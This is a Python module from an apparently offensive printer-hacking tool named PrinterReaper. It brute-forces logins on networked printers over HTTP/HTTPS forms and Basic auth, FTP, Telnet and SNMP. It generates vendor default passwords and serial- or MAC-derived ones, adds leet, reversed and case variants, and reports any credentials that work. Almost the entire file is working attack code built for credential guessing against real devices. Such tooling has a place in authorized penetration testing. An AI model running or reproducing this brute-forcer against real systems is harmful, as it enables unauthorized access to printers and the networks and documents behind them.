#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PrinterReaper — Login Brute Force Module
=========================================
Tests default and derived credentials against printer management interfaces:
  - HTTP/HTTPS web admin (form login + HTTP Basic Auth + Digest)
  - FTP (port 21)
  - Telnet (port 23)
  - SNMP community strings (UDP/161)

Credential expansion pipeline:
  1. Vendor default credentials (from default_creds.py)
  2. Dynamic token resolution (__SERIAL__, __MAC6__, __MAC12__)
  3. Variation generation:
     - normal          → as-is
     - reverse         → password[::-1]
     - leet            → a→@, e→3, i→1, o→0, s→$, t→7, g→9
     - camelcase       → Password (first char uppercase)
     - UPPER           → PASSWORD
     - lower           → password
     - reverse_leet    → leet(reverse(password))

Usage:
    from modules.login_bruteforce import bruteforce
    results = bruteforce('192.168.0.152', vendor='epson', serial='XAABT77481')
"""
# Author    : Andre Henrique (@mrhenrike)
# GitHub    : https://github.com/mrhenrike
# LinkedIn  : https://linkedin.com/in/mrhenrike
# X/Twitter : https://x.com/mrhenrike

from __future__ import annotations

import ftplib
import logging
import re
import socket
import time
from dataclasses import dataclass, field
from typing import Dict, Iterator, List, Optional, Tuple

import requests
import urllib3

urllib3.disable_warnings()

from utils.default_creds import (
    Cred, SERIAL_TOKEN, MAC6_TOKEN, MAC12_TOKEN,
    get_creds_for_vendor,
)

_log = logging.getLogger(__name__)

# ── ANSI colours ──────────────────────────────────────────────────────────────
_GRN = '\033[1;32m'
_RED = '\033[1;31m'
_YEL = '\033[1;33m'
_CYN = '\033[1;36m'
_DIM = '\033[2;37m'
_RST = '\033[0m'

# ── Constants ─────────────────────────────────────────────────────────────────
DEFAULT_TIMEOUT   = 6.0
DEFAULT_DELAY     = 0.3   # seconds between attempts (avoid lockouts)
MAX_ATTEMPTS      = 300   # hard cap on credential attempts

# Common HTTP login form paths per vendor (probed in order)
_HTTP_PATHS = [
    # Generic
    '/',
    '/login',
    '/admin',
    '/admin/login',
    '/web/login',
    '/cgi-bin/login.cgi',
    # HP EWS
    '/hp/device/this.LCDispatcher?nav=hp.Print',
    # Ricoh Web Image Monitor
    '/web/',
    # Kyocera Command Center RX
    '/login.html',
    # Xerox
    '/status',
    # Epson Web Config
    '/PRESENTATION/HTML/TOP/PRTINFO.HTML',
    '/web/index.cgi',
    # Brother
    '/general/status.html',
    # Samsung SyncThru
    '/sws/app/wss/loginAction.sws',
    # Canon
    '/login.html',
    # CUPS / IPP web
    '/admin/',
]

# Known form field names for username/password
_FORM_USER_FIELDS  = ['user', 'userid', 'username', 'login', 'User', 'UserName', 'name',
                       'admin_id', 'j_username', 'loginId', 'id']
_FORM_PASS_FIELDS  = ['pass', 'password', 'passwd', 'Password', 'PASS', 'pwd',
                       'admin_pass', 'j_password', 'loginPassword', 'pw']


# ── Result types ──────────────────────────────────────────────────────────────

@dataclass
class LoginResult:
    """Represents a single login attempt result."""
    protocol:   str       # http / https / ftp / telnet / snmp
    host:       str
    port:       int
    username:   str
    password:   Optional[str]
    success:    bool
    status:     str       # 'found' / 'invalid' / 'timeout' / 'error' / 'lockout'
    evidence:   str = ''
    url:        str = ''

    def password_display(self) -> str:
        return self.password if self.password is not None else '(blank)'

    def __str__(self) -> str:
        icon = f"{_GRN}[FOUND]{_RST}" if self.success else f"{_DIM}[----]{_RST}"
        return (f"{icon} {self.protocol.upper():<6} "
                f"{self.username!r:<14} / {self.password_display()!r:<20} "
                f"→ {self.status}")


@dataclass
class BruteforceReport:
    """Summary of brute-force campaign."""
    host:        str
    vendor:      str
    serial:      str
    total:       int = 0
    found:       List[LoginResult] = field(default_factory=list)
    all_results: List[LoginResult] = field(default_factory=list)

    @property
    def success(self) -> bool:
        return bool(self.found)


# ── Credential variation engine ───────────────────────────────────────────────

_LEET_MAP = str.maketrans({
    'a': '@', 'A': '@',
    'e': '3', 'E': '3',
    'i': '1', 'I': '1',
    'o': '0', 'O': '0',
    's': '$', 'S': '$',
    't': '7', 'T': '7',
    'g': '9', 'G': '9',
    'l': '|', 'L': '|',
    'b': '8', 'B': '8',
})


def leet(s: str) -> str:
    """Apply leet substitutions to a string."""
    return s.translate(_LEET_MAP)


def expand_password(
    raw_password: Optional[str],
    serial:       str = '',
    mac:          str = '',
    enable_variations: bool = True,
) -> List[Optional[str]]:
    """
    Expand a raw password token into a list of concrete passwords.

    Handles:
    - None  → blank string
    - __SERIAL__ → serial number + its variations
    - __MAC6__   → last 6 chars of MAC (no separators)
    - __MAC12__  → full MAC without separators
    - Regular strings → all variation modes

    Returns deduplicated ordered list.
    """
    mac_clean = re.sub(r'[:-]', '', mac).upper()
    mac6      = mac_clean[-6:] if mac_clean else ''
    mac12     = mac_clean

    # Resolve token
    if raw_password is None:
        base = ''
    elif raw_password == SERIAL_TOKEN:
        base = serial or ''
    elif raw_password == MAC6_TOKEN:
        base = mac6
    elif raw_password == MAC12_TOKEN:
        base = mac12
    else:
        base = raw_password

    if not base:
        # blank/empty password only
        return [None, '']

    seen: list = []
    def add(p: Optional[str]) -> None:
        if p not in seen:
            seen.append(p)

    add(base)                    # normal
    if enable_variations and base:
        add(base[::-1])          # reverse
        add(leet(base))          # leet
        add(base.capitalize())   # CamelCase (first char upper)
        add(base.upper())        # ALL UPPER
        add(base.lower())        # all lower
        add(leet(base[::-1]))    # reverse leet
        add(base + '1')          # append digit
        add(base + '!')          # append symbol
        add('1' + base)          # prepend digit
        # For serial-based: also try just last 8 / first 8 chars
        if raw_password == SERIAL_TOKEN and len(base) > 8:
            add(base[-8:])
            add(base[:8])
            add(base[-8:].lower())
            add(base[-8:].upper())

    return seen


def iter_credentials(
    vendor:            str,
    serial:            str = '',
    mac:               str = '',
    protocol_filter:   str = '',
    enable_variations: bool = True,
    extra_creds:       List[Tuple[str, Optional[str]]] = None,
) -> Iterator[Tuple[str, Optional[str]]]:
    """
    Yield (username, password) pairs for brute-forcing.

    Combines vendor defaults + generic + user-supplied extras.
    Expands dynamic tokens and variation modes.
    Deduplicates.
    """
    creds = get_creds_for_vendor(vendor)

    # Prepend user-supplied extras
    if extra_creds:
        for u, p in extra_creds:
            creds.insert(0, Cred(u, p, 'any'))

    seen: set = set()
    count = 0

    for cred in creds:
        if protocol_filter and cred.protocol not in ('any', protocol_filter, 'http', 'https'):
            if cred.protocol != protocol_filter:
                continue

        passwords = expand_password(cred.password, serial, mac, enable_variations)
        for pwd in passwords:
            pair = (cred.username, pwd)
            if pair in seen:
                continue
            seen.add(pair)
            yield cred.username, pwd
            count += 1
            if count >= MAX_ATTEMPTS:
                return


# ── HTTP attack ───────────────────────────────────────────────────────────────

def _detect_http_login(host: str, port: int, scheme: str,
                        timeout: float) -> Tuple[str, str, str]:
    """
    Probe printer web interface to discover login URL and form field names.

    Returns: (login_url, user_field, pass_field)
    """
    for path in _HTTP_PATHS:
        url = f"{scheme}://{host}:{port}{path}"
        try:
            r = requests.get(url, timeout=timeout, verify=False,
                             allow_redirects=True)
            text = r.text.lower()
            if r.status_code in (401,):
                return url, '', ''   # Basic/Digest auth
            if any(kw in text for kw in ('login', 'password', 'signin', 'userid', 'username')):
                # Identify form fields
                uf = next((f for f in _FORM_USER_FIELDS if f.lower() in text), 'username')
                pf = next((f for f in _FORM_PASS_FIELDS if f.lower() in text), 'password')
                return url, uf, pf
        except Exception:
            continue
    return f"{scheme}://{host}:{port}/", 'username', 'password'


def _try_http_login(session: requests.Session, url: str,
                     user_field: str, pass_field: str,
                     username: str, password: Optional[str],
                     timeout: float) -> Tuple[bool, int, str]:
    """
    Attempt login via HTTP form POST + HTTP Basic Auth.

    Returns: (success, status_code, evidence)
    """
    pwd = password if password is not None else ''

    # 1. Try HTTP Basic / Digest (works for many printers)
    try:
        r = requests.get(url, auth=(username, pwd),
                         timeout=timeout, verify=False, allow_redirects=True)
        if r.status_code == 200 and not any(
            kw in r.text.lower() for kw in ('login', 'invalid', 'unauthorized', 'error')
        ):
            return True, r.status_code, f'Basic auth accepted at {url}'
    except Exception:
        pass

    # 2. Try POST form
    try:
        post_data = {user_field: username, pass_field: pwd}
        r = session.post(url, data=post_data, timeout=timeout,
                         verify=False, allow_redirects=True)
        code = r.status_code
        text = r.text.lower()

        # Heuristics for success
        if code in (200, 302, 301):
            fail_indicators = (
                'invalid password', 'incorrect password', 'login failed',
                'authentication failed', 'wrong password', 'denied',
                'unauthorized', 'error', 'failed', 'bad credentials',
            )
            success_indicators = (
                'logout', 'signout', 'sign out', 'dashboard', 'settings',
                'configuration', 'status', 'printer info', 'admin',
                'maintenance', 'network', 'security',
            )
            has_fail    = any(kw in text for kw in fail_indicators)
            has_success = any(kw in text for kw in success_indicators)

            if has_success and not has_fail:
                return True, code, f'Form POST accepted (status {code}) at {url}'

        if code == 302 and 'location' in r.headers:
            loc = r.headers['location'].lower()
            if 'logout' not in loc and 'login' not in loc:
                return True, code, f'Redirect to {loc} after POST — likely success'

    except requests.exceptions.ConnectionError:
        return False, 0, 'connection_error'
    except Exception as exc:
        return False, 0, str(exc)[:60]

    return False, 0, ''


def bruteforce_http(
    host:              str,
    port:              int = 80,
    vendor:            str = 'generic',
    serial:            str = '',
    mac:               str = '',
    scheme:            str = 'http',
    timeout:           float = DEFAULT_TIMEOUT,
    delay:             float = DEFAULT_DELAY,
    enable_variations: bool = True,
    stop_on_first:     bool = True,
    extra_creds:       List[Tuple[str, Optional[str]]] = None,
    verbose:           bool = True,
) -> List[LoginResult]:
    """HTTP/HTTPS brute force against printer web interface."""
    results: List[LoginResult] = []

    login_url, user_field, pass_field = _detect_http_login(host, port, scheme, timeout)
    if verbose:
        print(f"\n  {_CYN}[HTTP BF]{_RST} {scheme}://{host}:{port} | "
              f"vendor={vendor} serial={serial or '-'}")
        print(f"  Login URL: {login_url}  fields: {user_field!r}/{pass_field!r}")

    session = requests.Session()
    session.verify = False

    for username, password in iter_credentials(
        vendor, serial, mac, 'http', enable_variations, extra_creds
    ):
        pwd_display = password if password is not None else '(blank)'
        if verbose:
            print(f"  {_DIM}» {username!r:<14} / {pwd_display!r}{_RST}", end='\r')

        success, code, evidence = _try_http_login(
            session, login_url, user_field, pass_field,
            username, password, timeout,
        )

        result = LoginResult(
            protocol  = scheme,
            host      = host,
            port      = port,
            username  = username,
            password  = password,
            success   = success,
            status    = 'found' if success else 'invalid',
            evidence  = evidence,
            url       = login_url,
        )
        results.append(result)

        if success:
            print(f"\n  {_GRN}[+] FOUND:{_RST} {scheme.upper()} {host}:{port} "
                  f"→ {username!r} / {pwd_display!r}")
            if verbose:
                print(f"       Evidence: {evidence}")
            if stop_on_first:
                break

        time.sleep(delay)

    return results


# ── FTP attack ────────────────────────────────────────────────────────────────

def bruteforce_ftp(
    host:              str,
    port:              int = 21,
    vendor:            str = 'generic',
    serial:            str = '',
    mac:               str = '',
    timeout:           float = DEFAULT_TIMEOUT,
    delay:             float = DEFAULT_DELAY,
    enable_variations: bool = True,
    stop_on_first:     bool = True,
    extra_creds:       List[Tuple[str, Optional[str]]] = None,
    verbose:           bool = True,
) -> List[LoginResult]:
    """FTP brute force against printer file system."""
    results: List[LoginResult] = []

    # Check if FTP is open first
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
    except Exception:
        return results  # FTP not open

    if verbose:
        print(f"\n  {_CYN}[FTP BF]{_RST} {host}:{port} | vendor={vendor}")

    for username, password in iter_credentials(
        vendor, serial, mac, 'ftp', enable_variations, extra_creds
    ):
        pwd_display = password if password is not None else '(blank)'
        if verbose:
            print(f"  {_DIM}» {username!r:<14} / {pwd_display!r}{_RST}", end='\r')

        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=timeout)
            ftp.login(username, password or '')
            # Success
            listing = ''
            try:
                listing = str(ftp.nlst()[:10])
            except Exception:
                pass
            ftp.quit()

            result = LoginResult(
                protocol = 'ftp',
                host     = host,
                port     = port,
                username = username,
                password = password,
                success  = True,
                status   = 'found',
                evidence = f'FTP login successful. Files: {listing[:80]}',
            )
            results.append(result)
            print(f"\n  {_GRN}[+] FOUND:{_RST} FTP {host}:{port} "
                  f"→ {username!r} / {pwd_display!r}")
            if stop_on_first:
                break

        except ftplib.error_perm:
            results.append(LoginResult('ftp', host, port, username, password,
                                       False, 'invalid'))
        except Exception as exc:
            results.append(LoginResult('ftp', host, port, username, password,
                                       False, 'error', str(exc)[:40]))
        time.sleep(delay)

    return results


# ── SNMP community string attack ──────────────────────────────────────────────

_SNMP_TEST_OID = '1.3.6.1.2.1.1.1.0'   # sysDescr


def bruteforce_snmp(
    host:              str,
    port:              int = 161,
    vendor:            str = 'generic',
    serial:            str = '',
    mac:               str = '',
    timeout:           float = 3.0,
    enable_variations: bool = False,  # variations rarely useful for SNMP strings
    stop_on_first:     bool = False,
    extra_creds:       List[Tuple[str, Optional[str]]] = None,
    verbose:           bool = True,
) -> List[LoginResult]:
    """Test SNMP community strings (read and write)."""
    results: List[LoginResult] = []

    try:
        import warnings
        warnings.filterwarnings('ignore', category=RuntimeWarning)
        from pysnmp.hlapi import (
            getCmd, CommunityData, UdpTransportTarget,
            ContextData, ObjectType, ObjectIdentity, SnmpEngine,
        )
    except ImportError:
        _log.debug("pysnmp not available — skipping SNMP brute force")
        return results

    if verbose:
        print(f"\n  {_CYN}[SNMP BF]{_RST} {host}:{port} | vendor={vendor}")

    # Collect community strings: passwords from snmp-protocol creds
    communities: List[str] = []
    seen_comm: set = set()
    for cred in get_creds_for_vendor(vendor):
        if cred.protocol in ('snmp', 'any'):
            comm = cred.username or (cred.password or '')
            for c in ([comm] + ([comm[::-1], leet(comm)] if enable_variations else [])):
                if c and c not in seen_comm:
                    seen_comm.add(c)
                    communities.append(c)

    # Add extra_creds if any
    if extra_creds:
        for u, p in extra_creds:
            for c in [u, p]:
                if c and c not in seen_comm:
                    seen_comm.add(c)
                    communities.append(c)

    # Common additional communities
    for common in ['public', 'private', 'internal', 'manager', 'SNMP_trap',
                   'admin', 'guest', serial.lower(), serial.upper()]:
        if common and common not in seen_comm:
            seen_comm.add(common)
            communities.append(common)

    for comm in communities:
        if verbose:
            print(f"  {_DIM}» community={comm!r}{_RST}", end='\r')

        try:
            for err_ind, err_stat, _, var_binds in getCmd(
                SnmpEngine(),
                CommunityData(comm, mpModel=1),
                UdpTransportTarget((host, port), timeout=timeout, retries=0),
                ContextData(),
                ObjectType(ObjectIdentity(_SNMP_TEST_OID)),
            ):
                if not err_ind and not err_stat:
                    descr = str(var_binds[0][1])[:80] if var_binds else ''
                    result = LoginResult(
                        protocol = 'snmp',
                        host     = host,
                        port     = port,
                        username = comm,
                        password = None,
                        success  = True,
                        status   = 'found',
                        evidence = f'sysDescr: {descr}',
                    )
                    results.append(result)
                    print(f"\n  {_GRN}[+] FOUND:{_RST} SNMP community={comm!r}")
                    if verbose:
                        print(f"       sysDescr: {descr}")
                    if stop_on_first:
                        return results
                    break
        except Exception:
            pass

    return results


# ── Telnet attack ─────────────────────────────────────────────────────────────

def bruteforce_telnet(
    host:              str,
    port:              int = 23,
    vendor:            str = 'generic',
    serial:            str = '',
    mac:               str = '',
    timeout:           float = DEFAULT_TIMEOUT,
    delay:             float = DEFAULT_DELAY,
    enable_variations: bool = True,
    stop_on_first:     bool = True,
    extra_creds:       List[Tuple[str, Optional[str]]] = None,
    verbose:           bool = True,
) -> List[LoginResult]:
    """Telnet brute force against printer management interface."""
    results: List[LoginResult] = []

    # Check if Telnet is open
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        banner = b''
        s.settimeout(2)
        try:
            banner = s.recv(256)
        except Exception:
            pass
        s.close()
    except Exception:
        return results   # Telnet not open

    if verbose:
        print(f"\n  {_CYN}[TELNET BF]{_RST} {host}:{port} | vendor={vendor}")

    for username, password in iter_credentials(
        vendor, serial, mac, 'telnet', enable_variations, extra_creds
    ):
        pwd_display = password if password is not None else '(blank)'
        if verbose:
            print(f"  {_DIM}» {username!r:<14} / {pwd_display!r}{_RST}", end='\r')

        try:
            import telnetlib
            tn = telnetlib.Telnet(host, port, timeout=timeout)
            tn.read_until(b'login:', timeout=timeout)
            tn.write((username + '\n').encode('ascii'))
            tn.read_until(b'Password:', timeout=timeout)
            tn.write(((password or '') + '\n').encode('ascii'))
            time.sleep(1)
            out = tn.read_very_eager().decode('latin-1', errors='replace')
            tn.close()

            if any(kw in out.lower() for kw in ('$', '#', '%', '>', 'welcome', 'hp', 'kyocera')):
                result = LoginResult(
                    protocol = 'telnet',
                    host     = host,
                    port     = port,
                    username = username,
                    password = password,
                    success  = True,
                    status   = 'found',
                    evidence = f'Shell prompt after login: {out[:60]}',
                )
                results.append(result)
                print(f"\n  {_GRN}[+] FOUND:{_RST} TELNET {host}:{port} "
                      f"→ {username!r} / {pwd_display!r}")
                if stop_on_first:
                    break
            else:
                results.append(LoginResult('telnet', host, port, username, password,
                                           False, 'invalid'))
        except Exception:
            results.append(LoginResult('telnet', host, port, username, password,
                                       False, 'timeout'))

        time.sleep(delay)

    return results


# ── Main orchestrator ─────────────────────────────────────────────────────────

def bruteforce(
    host:              str,
    vendor:            str = 'generic',
    serial:            str = '',
    mac:               str = '',
    open_ports:        List[int] = None,
    timeout:           float = DEFAULT_TIMEOUT,
    delay:             float = DEFAULT_DELAY,
    enable_variations: bool = True,
    stop_on_first:     bool = True,
    extra_creds:       List[Tuple[str, Optional[str]]] = None,
    test_http:         bool = True,
    test_ftp:          bool = True,
    test_snmp:         bool = True,
    test_telnet:       bool = True,
    verbose:           bool = True,
) -> BruteforceReport:
    """
    Run brute-force login campaign against a printer target.

    Args:
        host:               Target IP or hostname.
        vendor:             Printer vendor/make (e.g. 'epson', 'hp', 'ricoh').
        serial:             Device serial number (used for __SERIAL__ token).
        mac:                MAC address string (used for __MAC6__ / __MAC12__ tokens).
        open_ports:         List of known open ports (to skip probing closed ports).
        timeout:            Socket/HTTP timeout in seconds.
        delay:              Delay between attempts (seconds) to avoid lockouts.
        enable_variations:  Generate password variations (reverse, leet, etc.)
        stop_on_first:      Stop each protocol BF after first successful credential.
        extra_creds:        Additional (username, password) pairs to test.
        test_http/ftp/snmp/telnet: Which protocols to test.
        verbose:            Print attempt progress.

    Returns:
        BruteforceReport with all results and found credentials.
    """
    ports = set(open_ports or [])
    report = BruteforceReport(host=host, vendor=vendor, serial=serial)

    if verbose:
        print(f"\n  {'='*60}")
        print(f"  {_CYN}BRUTE FORCE LOGIN — {host}{_RST}")
        print(f"  {'='*60}")
        print(f"  Vendor   : {vendor or 'generic'}")
        print(f"  Serial   : {serial or '(not provided)'}")
        print(f"  MAC      : {mac or '(not provided)'}")
        print(f"  Variations: {'YES' if enable_variations else 'NO'}")
        print()

    all_results: List[LoginResult] = []

    # ── HTTP (port 80)
    if test_http and (not ports or 80 in ports or 443 in ports or 8080 in ports):
        for port, scheme in [(80, 'http'), (443, 'https'), (8080, 'http'), (8443, 'https')]:
            if ports and port not in ports:
                continue
            r = bruteforce_http(
                host, port, vendor, serial, mac, scheme,
                timeout, delay, enable_variations, stop_on_first, extra_creds, verbose,
            )
            all_results.extend(r)
            if stop_on_first and any(x.success for x in r):
                break

    # ── FTP (port 21)
    if test_ftp and (not ports or 21 in ports):
        r = bruteforce_ftp(
            host, 21, vendor, serial, mac,
            timeout, delay, enable_variations, stop_on_first, extra_creds, verbose,
        )
        all_results.extend(r)

    # ── SNMP (port 161)
    if test_snmp and (not ports or 161 in ports or True):  # always try SNMP
        r = bruteforce_snmp(
            host, 161, vendor, serial, mac,
            timeout, enable_variations, stop_on_first=False, extra_creds=extra_creds,
            verbose=verbose,
        )
        all_results.extend(r)

    # ── Telnet (port 23)
    if test_telnet and (not ports or 23 in ports):
        r = bruteforce_telnet(
            host, 23, vendor, serial, mac,
            timeout, delay, enable_variations, stop_on_first, extra_creds, verbose,
        )
        all_results.extend(r)

    report.all_results = all_results
    report.total       = len(all_results)
    report.found       = [r for r in all_results if r.success]

    return report


# ── Output ────────────────────────────────────────────────────────────────────

def print_report(report: BruteforceReport) -> None:
    """Print brute-force report to stdout."""
    print(f"\n  {'='*60}")
    print(f"  {_CYN}BRUTE FORCE REPORT — {report.host}{_RST}")
    print(f"  {'='*60}")
    print(f"  Total attempts : {report.total}")
    print(f"  Found          : {len(report.found)}")

    if report.found:
        print(f"\n  {_GRN}{'[+] CREDENTIALS FOUND':}")
        print(f"  {'-'*60}{_RST}")
        for r in report.found:
            print(f"  {_GRN}[{r.protocol.upper()}]{_RST} "
                  f"{r.username!r:<14} / {r.password_display()!r:<24}")
            if r.evidence:
                print(f"         {_DIM}{r.evidence[:72]}{_RST}")
            if r.url:
                print(f"         {_DIM}{r.url}{_RST}")
    else:
        print(f"\n  {_DIM}No credentials found. "
              f"Device may have non-default credentials.{_RST}")
        print(f"  If serial number was not provided, try --bf-serial <SERIAL>")

    print()
